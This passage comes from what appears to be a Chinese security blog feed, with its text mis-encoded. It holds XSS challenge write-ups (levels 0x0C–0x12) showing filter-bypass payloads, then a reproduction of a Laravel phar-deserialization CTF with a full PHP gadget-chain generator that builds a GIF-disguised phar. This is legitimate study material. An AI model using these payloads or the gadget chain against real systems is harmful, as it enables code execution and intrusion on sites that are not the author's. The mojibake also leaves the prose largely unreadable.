title="0x0C"></a>0x0C</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>emmmï¼Œè¿™ä¸ªé¢˜ç›®æœ‰ç‚¹æ°´å•Šâ€¦â€¦å°±æ˜¯å¤šè¿‡æ»¤äº†ä¸€ä¸ªscriptï¼Œé‚£ä¸ç”¨scriptå°±å¥½äº†ï¼Œæ–¹æ³•å¤šçš„ç”¨ä¸è¿‡æ¥è€Œä¸”ä¸Šä¸€æ¬¡payloadåŒæ ·æœ‰æ•ˆã€‚<code>&lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;</code></p><h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç§è¾“å…¥ç‚¹å‡ºç°åœ¨jsçš„å•è¡Œæ³¨é‡ŠåŒºåŸŸï¼Œå¯ä»¥ç”¨æ¢è¡Œç»•è¿‡å•è¡Œæ³¨é‡Šã€‚å‰©ä¸‹çš„ä¸€æ­¥æ€è€ƒäº†å¾ˆå¤šï¼Œç”±äºè¿‡æ»¤äº†<code>&lt;/&quot;&#39;</code>ï¼Œä¸èƒ½é—­åˆæœ«å°¾çš„<code>&#39;)</code>ï¼Œä¹Ÿä¸èƒ½ç”¨æ™®é€šçš„æ³¨é‡Š<code>//</code>ï¼Œ<code>/*</code>ï¼Œ<code>&lt;!--</code>ã€‚çœ‹äº†çœ‹writeupï¼Œç»“æœæ˜¯ç”¨<code>--&gt;</code>ï¼Œæˆ‘æœ‰ç‚¹å‚»çœ¼äº†ï¼Œä»€ä¹ˆé¬¼â€¦â€¦</p><p>æµ‹è¯•äº†ä¸€ä¼šå„¿ï¼Œå¾—å‡ºç»“è®ºï¼š<code>--&gt;</code>æœ‰å’Œ<code>//</code>ä¸€æ ·çš„æ•ˆæœï¼ŒåŒæ ·æ˜¯å•è¡Œæ³¨é‡Šã€‚è¿™ä¸ªçœŸçš„æ˜¯æ¶¨å§¿åŠ¿äº†ï¼Œä»¥å‰åªçŸ¥é“ç”¨ä¸Šé¢çš„ä¸‰ç§ï¼Œç»“æœç°åœ¨åˆæ¥ä¸€ç§ã€‚</p><p>payloadï¼š<code>æ¢è¡Œalert(1)æ¢è¡Œ--&gt;</code></p><h2 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·æƒ³äº†è€ä¹…ï¼Œçœ‹äº†å…¶ä»–äººçš„æ€è·¯æç„¶å¤§æ‚Ÿâ€¦â€¦è¿™é‡Œç”±äºæŠŠæ‰€æœ‰çš„æ ‡ç­¾å‰é¢éƒ½åŠ äº†ä¸‹åˆ’çº¿ï¼ŒåŸºæœ¬ä¸Šæ­£å¸¸ä½¿ç”¨çš„æ ‡ç­¾éƒ½GGã€‚ç„¶è€Œè¿™é‡Œè¦ç”¨åˆ°ä¹‹å‰çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œé‚£å°±æ˜¯å‡ºç°åœ¨è¿™ç§æœ‰å¤§å°å†™è½¬æ¢çš„åœ°æ–¹ï¼Œæœ‰äº›ç‰¹æ®Šå­—ç¬¦åœ¨è½¬æ¢çš„æ—¶å€™ä¹Ÿä¼šå˜æˆæ­£å¸¸çš„è‹±æ–‡å¤§å†™å­—æ¯ã€‚å‚è€ƒï¼š<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p><p>èƒ½åˆ©ç”¨çš„æ˜¯iå’Œsï¼Œè¿™é‡Œç”¨ç‰¹æ®Šå­—ç¬¦ç»•è¿‡æ­£åˆ™ï¼Œç„¶åé€šè¿‡å¤§å†™å‡½æ•°è½¬æ¢æˆæ­£å¸¸å­—æ¯è¾¾åˆ°ç›®çš„ã€‚<code>&lt;Ä±mg src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;</code>æˆ–è€…<code>&lt;Å¿cript src=https://xss.haozi.me/j.js&gt;&lt;/script&gt;</code></p><h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f;'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror="console.error('<span class="subst">$&#123;escapeHtml(input)&#125;</span>')"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç¼–ç é™¤äº†å®ä½“ç¼–ç æ˜¯å¼ºè¡Œå˜æˆå­—ç¬¦ä¸²ï¼Œå…¶ä»–çš„<code>&amp;#</code>ç±»ç¼–ç éƒ½æ˜¯å¯ä»¥ç”¨çš„ï¼Œå…¸å‹çš„çº¸è€è™è¿‡æ»¤ã€‚æ‰€ä»¥è¿™é‡Œä»å•å¼•å·é€ƒé€¸å‡ºæ¥ï¼Œæ’å…¥alertï¼Œè¿‡æ»¤åé¢çš„æ— ç”¨éƒ¨åˆ†ã€‚</p><p><code>&#39;);alert(1);//</code></p><h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æœ‰ç‚¹è«åå…¶å¦™ã€‚ã€‚ã€‚éšæ‰‹è¾“å…¥äº†ä¸€ä¸ª<code>alert(1)</code>å°±æˆåŠŸäº†ã€‚ã€‚ã€‚éƒ½ä¸çŸ¥é“å‘ç”Ÿäº†ä»€ä¹ˆã€‚</p><p>çœ‹äº†å…¶ä»–äººçš„ç­”æ¡ˆéƒ½æ˜¯é—­åˆè¯­å¥ï¼Œç„¶åæ’å…¥çš„<code>alert(1)</code>ã€‚<code>1;alert(1);</code></p><p>æŸ¥äº†ä¸€ä¸‹windowçš„å±æ€§åˆ—è¡¨ï¼Œæ²¡æœ‰dataå±æ€§ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è¾“å…¥<code>alert(1)</code>å°±ä¼šè§¦å‘å¼¹çª—ã€‚</p><h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'\\\''</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">'\\`'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\74'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'\\76'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">'\\r'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">'\\t'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">'\\f'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">'\\v'</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, '\\b')</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">'\\0'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = 'javascript:console.log("<span class="subst">$&#123;s&#125;</span>")'</span></span><br><span class="line"><span class="string">  var a = document.createElement('a')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆæ˜¯ä¸€ä¸ªçº¸è€è™è¿‡æ»¤ï¼Œåœ¨jsçš„å­—ç¬¦ä¸²ä¸­ä»£å…¥åæ–œçº¿ä¼šè¢«è§£é‡Šæˆè½¬ä¹‰ç¬¦ï¼Œä½†æ˜¯ç”±äºåŸæœ¬æ•´ä½“å°±æ˜¯å­—ç¬¦ä¸²æ‰€ä»¥è½¬ä¹‰ç¬¦è½¬ä¹‰è¿‡åè¿˜æ˜¯å­—ç¬¦ä¸²ï¼Œç­‰äºæ²¡æœ‰æ„ä¹‰ï¼Œæ‰€ä»¥ç›´æ¥é—­åˆå‰é¢çš„<code>console.log</code>æ’å…¥jsè¯­å¥ã€‚</p><p><code>&#39;console.log(&quot;\&quot;)\/\/&#39;</code> åƒè¿™æ ·çš„å­—ç¬¦ä¸²å®é™…ä¸Šä¸º<code>&#39;console.log(&quot;&quot;)//&#39;</code>ã€‚å¯ä»¥çœ‹åˆ°åæ–œçº¿åœ¨å­—ç¬¦ä¸²ä¸­æ²¡æœ‰ä»»ä½•ä½œç”¨ã€‚</p><p>æœ€åpayloadï¼š<code>&quot;);alert(&quot;1</code>æˆ–è€…<code>&quot;);alert(1)//</code></p><h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œä¸Šä¸€é¢˜ç±»ä¼¼çš„é¢˜ç›®ï¼Œåªæ˜¯æ²¡æœ‰äº†å¤šä½™çš„å­—ç¬¦ä¸²ä¸­è½¬ï¼Œç°åœ¨çš„åæ–œçº¿å°±æœ‰æ•ˆæœäº†ï¼Œç„¶è€Œæ²¡æœ‰è¿‡æ»¤åæ–œçº¿ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç”¨åæ–œçº¿è½¬ä¹‰è¿‡æ»¤ç”¨çš„é‚£ä¸ªåæ–œçº¿ï¼Œè¿™æ ·å°±é€ æˆå­—ç¬¦ä¸²é€ƒé€¸ï¼Œéšæ„æ’å…¥è¯­å¥å³å¯ã€‚</p><p><code>\&quot;);alert(1)//</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="XSS" scheme="https://hurricane618.me/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>code-breaking lumenserial å¤ç°</title>
    <link href="https://hurricane618.me/2019/01/24/code-breaking-lumenserial/"/>
    <id>https://hurricane618.me/2019/01/24/code-breaking-lumenserial/</id>
    <published>2019-01-24T00:54:06.000Z</published>
    <updated>2019-01-24T01:29:31.967Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>phpçš„laravelæ¡†æ¶çš„å®¡è®¡é¢˜ç›®ã€‚è¿™é‡Œè®°å½•ä¸€ä¸‹å¤ç°è¿‡ç¨‹ã€‚æ•´ä½“æ€è·¯æ˜¯venenof7å¸ˆå‚…çš„ã€‚</p><p>å…ˆæ¥çœ‹å…¥å£ï¼Œä¸çŸ¥é“ä»–ä»¬æ€ä¹ˆå°±æ‰¾åˆ°äº†è¿™ä¸ªè¯·æ±‚â€¦â€¦</p><p><code>/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/</code></p><p>æˆ‘åœ¨é»‘ç›’æµ‹è¯•çš„æ—¶å€™åªæ‰¾åˆ°äº†actionï¼Œå®Œå…¨æ²¡æœ‰sourceçš„å½±å­ï¼Œä¸ªäººæ„Ÿè§‰æ˜¯ç»“åˆç™½ç›’æµ‹è¯•å‡ºæ¥çš„ã€‚è¿™é‡Œå¯¹åº”çš„æºä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">doCatchimage</span><span class="params">(Request $request)</span></span>&#123;</span><br><span class="line">$sources = $request-&gt;input(<span class="keyword">$this</span>-&gt;config[<span class="string">'catcherFieldName'</span>]);</span><br><span class="line">$rets = [];</span><br><span class="line"><span class="keyword">if</span> ($sources) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($sources <span class="keyword">as</span> $url) &#123;</span><br><span class="line">$rets[] = <span class="keyword">$this</span>-&gt;download($url);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> response()-&gt;json([</span><br><span class="line"><span class="string">'state'</span> =&gt; <span class="string">'SUCCESS'</span>,</span><br><span class="line"><span class="string">'list'</span> =&gt; $rets</span><br><span class="line">]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$maxSize = <span class="keyword">$this</span>-&gt;config[<span class="string">'catcherMaxSize'</span>];</span><br><span class="line">        $limitExtension = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($ext)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ltrim($ext, <span class="string">'.'</span>);</span><br><span class="line">        &#125;, <span class="keyword">$this</span>-&gt;config[<span class="string">'catcherAllowFiles'</span>]);</span><br><span class="line">        $allowTypes = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($ext)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"image/&#123;$ext&#125;"</span>;</span><br><span class="line">        &#125;, $limitExtension);</span><br><span class="line"></span><br><span class="line">        $content = file_get_contents($url);  urlä¸ºå›¾ç‰‡è·¯å¾„</span><br><span class="line">        $img = getimagesizefromstring($content);</span><br><span class="line">çœç•¥ä¸‹é¢çš„ä¸é‡è¦ä»£ç â€¦â€¦</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†<code>file_get_contents</code>è¿›è¡Œæ–‡ä»¶æ“ä½œï¼ŒåŒæ ·æ˜¯ä½¿ç”¨blackhatè®®é¢˜ä¸Šçš„pharåœ¨æ–‡ä»¶æ“ä½œæ—¶ä¼šæ‰§è¡Œååºåˆ—åŒ–æ“ä½œã€‚è¿™é‡Œåªéœ€è¦å¯»æ‰¾æœ‰<code>__destruct</code>å’Œ<code>__wakeup</code>çš„ç±»ã€‚</p><p>è¿™é‡Œå…¨å±€æœç´¢<code>__destruct</code>ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ª<code>class PendingBroadcast</code>ï¼Œå…¶ä»–çš„éƒ½ä¸å¤ªèƒ½ä½¿ç”¨ï¼Œè¦ä¸æ˜¯destructé‡Œé¢æ²¡ä¸œè¥¿ï¼Œå°±æ˜¯destructé‡Œé¢æ‰§è¡Œæ–¹æ³•çš„å¯¹è±¡ä¸å¯æ§ã€‚è€Œè¿™ä¸ªå”¯ä¸€ä¸€ä¸ªæ‰§è¡Œæ–¹æ³•çš„å¯¹è±¡å¯æ§çš„ï¼Œå¯ä»¥å°†æ‰§è¡Œæ–¹æ³•çš„å¯¹è±¡æ¢æˆæ²¡æœ‰è¯¥æ–¹æ³•çš„å¯¹è±¡ï¼Œè¿™æ ·å°±ä¼šè°ƒç”¨<code>__call</code>æ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœç´¢<code>__call</code>å¾—åˆ°<code>Generator</code>è¿™ä¸ªç±»ä¸­æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œå¹¶ä¸”å…¶ä¸­çš„<code>__call</code>èƒ½è°ƒç”¨<code>format</code>è€Œè¿™ä¸ªåˆä¼šè°ƒç”¨<code>call_user_func_array</code>ï¼Œè¿™é‡Œå°±å¯ä»¥æ‰§è¡Œä»£ç äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($formatter, $arguments = array<span class="params">()</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $attributes)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span><span class="params">($formatter)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> $provider) &#123;</span><br><span class="line"><span class="keyword">if</span> (method_exists($provider, $formatter)) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters[$formatter] = <span class="keyword">array</span>($provider, $formatter);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> \InvalidArgumentException(sprintf(<span class="string">'Unknown formatter "%s"'</span>, $formatter));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¸€å¼€å§‹æ„é€ çš„æ˜¯åªèƒ½æ‰§è¡Œå•ä¸ªå‡½æ•°ï¼Œé€šè¿‡åœ¨formattersä¸­çš„æ•°ç»„å­˜å‚¨å‡½æ•°åï¼Œæœ€åè¢«è°ƒç”¨ï¼Œåªæ˜¯ç°åœ¨è¿˜æ²¡åŠæ³•ä»£å…¥å‚æ•°ã€‚æ¥çœ‹çœ‹venenof7å¸ˆå‚…çš„payloadã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line"><span class="keyword">protected</span> $event;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line"><span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($forma)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters = $forma;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">$<span class="title">obj_1</span> = <span class="title">array</span>("<span class="title">dispatch</span>"=&gt;"<span class="title">phpinfo</span>");</span><br><span class="line">$obj_2 = <span class="keyword">new</span> Faker\Generator($obj_1);</span><br><span class="line">$obj = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($obj_2, <span class="number">1</span>);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./1.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'1.txt'</span>, <span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'./1.phar'</span>, <span class="string">'1.gif'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼ å…¥æ•°ç»„æ˜¯å› ä¸º<code>getFormatter</code>å‡½æ•°ä¼šå–formattersæ•°ç»„ä¸­çš„å¯¹åº”æ–¹æ³•åçš„å€¼ã€‚</p><p>è¿™é‡Œç”Ÿæˆ1.giféœ€è¦å…ˆæŠŠpharçš„åªè¯»æ”¹æˆå¯ä»¥å†™æ‰è¡Œã€‚å…·ä½“æ“ä½œæŠŠé€‰é¡¹æ”¹æˆoffï¼Œå¹¶ä¸”å»é™¤æ³¨é‡Š<code>phar.readonly = Off</code></p><p>ç„¶è€Œï¼Œé‡å‘½åæ— æ³•æˆåŠŸæ‰§è¡Œâ€¦â€¦æ­»æ´»ä¸è¡Œã€‚ã€‚ã€‚æ‰‹åŠ¨ä¿®æ”¹ingï¼Œä¸Šä¼ 